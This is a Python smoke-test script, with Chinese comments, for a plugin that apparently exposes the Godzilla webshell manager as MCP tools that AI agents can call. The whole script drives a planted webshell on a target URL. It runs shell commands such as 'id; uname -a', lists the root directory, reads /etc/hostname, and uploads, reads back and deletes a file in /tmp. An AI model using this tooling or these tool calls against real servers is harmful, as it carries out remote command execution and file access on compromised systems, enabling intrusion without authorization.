#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Godzilla-MCP Headless · 冒烟测试

对一组目标 Webshell 跑通完整链路：
  add_shell -> get_basics_info -> exec_command -> list_files -> read_file -> upload_file -> 回读校验

用法:
  python3 test/smoke_test.py <targetUrl> <password> <secretKey> [payload] [cryption]

可选环境变量（与 scripts/ 一致）:
  GZ_HOME / MCP_WORKDIR / MCP_JAR / JAVA
"""
import os
import sys
import json
import glob
import base64
import subprocess

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(HERE)


def find_jar():
    if os.environ.get("MCP_JAR"):
        return os.environ["MCP_JAR"]
    for pattern in ("dist/godzilla-mcp-*.jar", "target/godzilla-mcp-*.jar"):
        found = sorted(glob.glob(os.path.join(REPO, pattern)))
        if found:
            return found[-1]
    sys.exit("[!] 未找到插件 JAR（dist/ 或 target/），或设置 MCP_JAR")


def find_gz_home():
    if os.environ.get("GZ_HOME"):
        return os.environ["GZ_HOME"]
    for d in (os.path.join(REPO, "godzilla"), os.path.expanduser("~/Godzilla"), os.getcwd()):
        if os.path.isfile(os.path.join(d, "godzilla.jar")):
            return d
    sys.exit("[!] 未找到 godzilla.jar，请设置 GZ_HOME=/path/to/Godzilla")


def main():
    if len(sys.argv) < 4:
        print(__doc__)
        sys.exit(1)

    url, password, secret_key = sys.argv[1], sys.argv[2], sys.argv[3]
    payload = sys.argv[4] if len(sys.argv) > 4 else "JavaDynamicPayload"
    cryption = sys.argv[5] if len(sys.argv) > 5 else "JAVA_AES_BASE64"

    jar = find_jar()
    gz_home = find_gz_home()
    workdir = os.environ.get("MCP_WORKDIR", gz_home)
    java = os.environ.get("JAVA", "java")
    cp = f"{jar}:{gz_home}/godzilla.jar"

    def req(i, method, params=None):
        o = {"jsonrpc": "2.0", "id": i, "method": method}
        if params is not None:
            o["params"] = params
        return json.dumps(o, ensure_ascii=False)

    calls = [
        req(1, "initialize", {}),
        req(2, "tools/call", {"name": "add_shell", "arguments": {
            "url": url, "password": password, "secretKey": secret_key,
            "payload": payload, "cryption": cryption}}),
        req(3, "tools/call", {"name": "get_basics_info", "arguments": {"targetUrl": url}}),
        req(4, "tools/call", {"name": "exec_command", "arguments": {
            "targetUrl": url, "command": '/bin/sh -c "id; echo MARK-OK; uname -a"'}}),
        req(5, "tools/call", {"name": "list_files", "arguments": {"targetUrl": url, "dirPath": "/"}}),
        req(6, "tools/call", {"name": "read_file", "arguments": {"targetUrl": url, "filePath": "/etc/hostname"}}),
        req(7, "tools/call", {"name": "upload_file", "arguments": {
            "targetUrl": url, "filePath": "/tmp/gz_smoke_test.txt",
            "base64Data": base64.b64encode(b"hello-godzilla-mcp").decode()}}),
        req(8, "tools/call", {"name": "read_file", "arguments": {
            "targetUrl": url, "filePath": "/tmp/gz_smoke_test.txt"}}),
        req(9, "tools/call", {"name": "exec_command", "arguments": {
            "targetUrl": url,
            "command": '/bin/sh -c "cat /tmp/gz_smoke_test.txt; rm -f /tmp/gz_smoke_test.txt; echo CLEANED"'}}),
    ]

    print(f"[*] jar={jar}")
    print(f"[*] GZ_HOME={gz_home}  WORKDIR={workdir}")
    p = subprocess.run([java, "-cp", cp, "shells.plugins.online.GodzillaMcpHeadlessBootstrap", "--stdio"],
                       input="\n".join(calls) + "\n", capture_output=True, text=True, timeout=420, cwd=workdir)
    print(f"[*] exit={p.returncode}")

    results = {}
    for ln in p.stdout.splitlines():
        try:
            o = json.loads(ln)
            results[o.get("id")] = o
        except Exception:
            print("[non-json stdout]", ln[:160])

    def text_of(o):
        r = o.get("result", {})
        if isinstance(r, dict) and "content" in r:
            return r["content"][0]["text"]
        if "error" in o:
            return "ERR: " + json.dumps(o["error"], ensure_ascii=False)
        return json.dumps(r, ensure_ascii=False)

    names = {1: "initialize", 2: "add_shell", 3: "get_basics_info", 4: "exec_command",
             5: "list_files(/)", 6: "read_file(/etc/hostname)", 7: "upload_file",
             8: "read_file(回读上传)", 9: "exec_command(cat+rm)"}
    ok = 0
    for i in range(1, 10):
        o = results.get(i)
        if not o:
            print(f"[{i}] {names[i]}: NO RESPONSE")
            continue
        t = text_of(o)
        if i in (4, 5, 6, 8, 9):
            try:
                t = base64.b64decode(t).decode("utf-8", "replace")
            except Exception:
                pass
        t = str(t)
        print(f"[{i}] {names[i]}: {t[:320]}".replace("\n", " \\n "))
        ok += 1
    print(f"\n[*] 完成: {ok}/9 个调用返回")


if __name__ == "__main__":
    main()
